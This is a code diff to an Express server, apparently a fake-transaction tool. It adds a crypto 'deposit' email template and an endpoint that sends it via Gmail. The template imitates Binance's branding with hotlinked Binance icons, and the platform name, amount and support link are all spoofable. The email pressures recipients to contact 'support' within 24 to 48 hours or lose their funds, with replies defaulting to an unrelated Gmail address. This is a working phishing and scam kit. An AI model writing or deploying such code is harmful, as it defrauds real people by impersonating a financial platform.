@@ -188,7 +188,186 @@ function getStatusStyles(status: TransactionStatus) {
   }
 }
 
+// Helper: Crypto Deposit Notification Template
+function generateCryptoEmailTemplate(data: { platform: string; status: string; crypto: string; amount: string; supportLink: string; warningMessage?: string; logoCid?: string }): string {
+  const { platform, status, crypto, amount, supportLink, warningMessage, logoCid } = data;
+  const date = new Date();
+  const year = date.getFullYear();
+  
+  const headerContent = logoCid 
+    ? `<img src="cid:${logoCid}" alt="${platform}" style="max-height: 40px; width: auto;" />`
+    : `<span style="color: #fcd535; font-size: 20px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px;">${platform}</span>`;
+
+  const supportHref = supportLink.includes('@') ? `mailto:${supportLink}` : supportLink;
+
+  const warningHtml = warningMessage ? `
+    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom: 24px; background-color: #fce8e6; border-left: 4px solid #dc2626; border-radius: 8px; width: 100%; border-collapse: separate;">
+      <tr>
+        <td style="padding: 14px 16px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 13px; color: #991b1b; font-weight: 600; line-height: 1.5; text-align: left; vertical-align: middle;">
+          <span style="font-size: 16px; margin-right: 8px; vertical-align: middle;">⚠️</span>
+          <span style="vertical-align: middle;">${warningMessage}</span>
+        </td>
+      </tr>
+    </table>
+  ` : '';
+
+  return `
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>${platform} Deposit ${status}</title>
+    </head>
+    <body style="margin: 0; padding: 0; background-color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
+      <table border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #ffffff;">
+        <tr>
+          <td align="center">
+            <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">
+              <!-- Header -->
+              <tr>
+                <td style="background-color: #1e2329; padding: 20px; text-align: center;">
+                  ${headerContent}
+                </td>
+              </tr>
+              
+              <!-- Content -->
+              <tr>
+                <td style="padding: 40px 30px;">
+                  <h1 style="font-size: 24px; font-weight: 700; color: #1e2329; margin: 0 0 20px 0;">${crypto} Deposit ${status}</h1>
+                  
+                  <p style="font-size: 16px; color: #474d57; line-height: 1.5; margin: 0 0 20px 0;">
+                    Your deposit of ${amount} ${crypto} is now ${status.toLowerCase()} in your <a href="#" style="color: #c99400; text-decoration: none; font-weight: 600;">${platform}</a> account. Log in to check your balance. Read our <a href="#" style="color: #c99400; text-decoration: none; font-weight: 600;">FAQs</a> if you are running into problems.
+                  </p>
+                  
+                  ${warningHtml}
+                  
+                  <table border="0" cellpadding="0" cellspacing="0" style="margin: 30px 0;">
+                    <tr>
+                      <td align="center" style="background-color: #fcd535; border-radius: 4px;">
+                        <a href="#" style="display: inline-block; padding: 12px 24px; font-size: 16px; font-weight: 700; color: #1e2329; text-decoration: none;">Visit Your Dashboard</a>
+                      </td>
+                    </tr>
+                  </table>
+                  
+                  <p style="font-size: 14px; color: #707a8a; line-height: 1.5; margin: 30px 0 0 0;">
+                    <a href="${supportHref}" style="color: #c99400; text-decoration: none; font-weight: 600;">Contact customer support</a> to verify your payment within 24 to 48 hours or your funds will be lost.
+                  </p>
+                  
+                  <p style="font-size: 14px; font-style: italic; color: #707a8a; margin: 20px 0 0 0;">
+                    This is an automated message, please do not reply, only reply to customer support.
+                  </p>
+                </td>
+              </tr>
+              
+              <!-- Divider -->
+              <tr>
+                <td style="padding: 0 30px;">
+                  <div style="border-top: 1px solid #eaecef;"></div>
+                </td>
+              </tr>
+              
+              <!-- Footer Socials -->
+              <tr>
+                <td align="center" style="padding: 30px 0;">
+                  <p style="font-size: 14px; font-weight: 700; color: #fcd535; margin: 0 0 15px 0;">Stay connected!</p>
+                  <table border="0" cellpadding="0" cellspacing="0">
+                    <tr>
+                      <td style="padding: 0 10px;"><img src="https://bin.bnbstatic.com/static/images/common/social/x.png" width="20" height="20" /></td>
+                      <td style="padding: 0 10px;"><img src="https://bin.bnbstatic.com/static/images/common/social/telegram.png" width="20" height="20" /></td>
+                      <td style="padding: 0 10px;"><img src="https://bin.bnbstatic.com/static/images/common/social/facebook.png" width="20" height="20" /></td>
+                      <td style="padding: 0 10px;"><img src="https://bin.bnbstatic.com/static/images/common/social/instagram.png" width="20" height="20" /></td>
+                    </tr>
+                  </table>
+                </td>
+              </tr>
+              
+              <!-- Footer Disclaimer -->
+              <tr>
+                <td style="padding: 0 30px 40px 30px;">
+                  <div style="background-color: #fcd535; border-radius: 4px; display: inline-block; padding: 4px 12px; margin-bottom: 15px;">
+                    <span style="font-size: 12px; font-weight: 700; color: #1e2329;">Anti-phishing</span>
+                  </div>
+                  <p style="font-size: 12px; color: #707a8a; margin: 0 0 20px 0;">To stay secure, setup your anti-phishing code <a href="#" style="color: #c99400; text-decoration: none;">here</a></p>
+                  
+                  <p style="font-size: 11px; color: #707a8a; line-height: 1.4; margin: 0;">
+                    <strong>Disclaimer:</strong> Digital asset prices are subject to high market risk and price volatility. The value of your investment may go down or up, and you may not get back the amount invested. You are solely responsible for your investment decisions and <a href="#" style="color: #c99400; text-decoration: none;">${platform}</a> is not liable for any losses you may incur. Past performance is not a reliable predictor of future performance. You should only invest in products you are familiar with and where you understand the risks.
+                  </p>
+                  <p style="font-size: 11px; color: #707a8a; line-height: 1.4; margin: 15px 0 0 0;">
+                    © ${year} <a href="#" style="color: #c99400; text-decoration: none;">${platform}</a>.com, All Rights Reserved.
+                  </p>
+                </td>
+              </tr>
+            </table>
+          </td>
+        </tr>
+      </table>
+    </body>
+    </html>
+  `;
+}
+
+// POST endpoint for Crypto Transfer Email
+app.post(["/api/send-crypto-email", "/send-crypto-email"], async (req: Request, res: Response) => {
+  const { senderEmail, receiverEmail, crypto, amount, platform, status, supportLink, warningMessage, logoImage } = req.body;
+  
+  if (!receiverEmail || !crypto || !amount || !platform || !status || !supportLink) {
+    res.status(400).json({ error: "Missing required fields" });
+    return;
+  }
+
+  const gmailUser = process.env.GMAIL_USER;
+  const gmailAppPass = process.env.GMAIL_APP_PASS;
+
+  if (!gmailUser || !gmailAppPass) {
+    res.status(400).json({ error: "Gmail SMTP credentials not configured" });
+    return;
+  }
+
+  try {
+    const logoCid = logoImage ? 'platform-logo' : undefined;
+    const htmlContent = generateCryptoEmailTemplate({ platform, status, crypto, amount, supportLink, warningMessage, logoCid });
+    const subject = `${crypto} Deposit ${status} - ${platform}`;
+
+    const transporter = nodemailer.createTransport({
+      host: "smtp.gmail.com",
+      port: 465,
+      secure: true,
+      auth: {
+        user: gmailUser,
+        pass: gmailAppPass,
+      },
+    });
+
+    const attachments: any[] = [];
+    if (logoImage && logoImage.startsWith('data:image/')) {
+      const base64Data = logoImage.split(',')[1];
+      attachments.push({
+        filename: 'logo.png',
+        content: Buffer.from(base64Data, 'base64'),
+        cid: logoCid
+      });
+    }
+
+    const mailOptions = {
+      from: `"${platform}" <${gmailUser}>`,
+      to: receiverEmail,
+      subject: subject,
+      html: htmlContent,
+      replyTo: senderEmail || "internationalbank2026@gmail.com",
+      attachments: attachments
+    };
+
+    await transporter.sendMail(mailOptions);
+    res.json({ success: true });
+  } catch (error: any) {
+    console.error("Error sending Crypto email:", error);
+    res.status(500).json({ error: error.message || "Failed to send email" });
+  }
+});
+
 // Helper: Unified High-Quality Paper-Texture Receipt Template Generator
+
 function generateModernPaperReceipt(tx: Transaction, isReceiver: boolean): string {
   const formattedDate = new Date(tx.date).toLocaleDateString("en-US", {
     month: "long",
@@ -981,6 +1160,7 @@ app.post("/api/auth/login", (req: Request, res: Response) => {
 
 // Refresh user status endpoint
 app.post("/api/auth/status", (req: Request, res: Response) => {
+  console.log("Received status check request for:", req.body);
   try {
     const { email } = req.body;
     if (!email) {
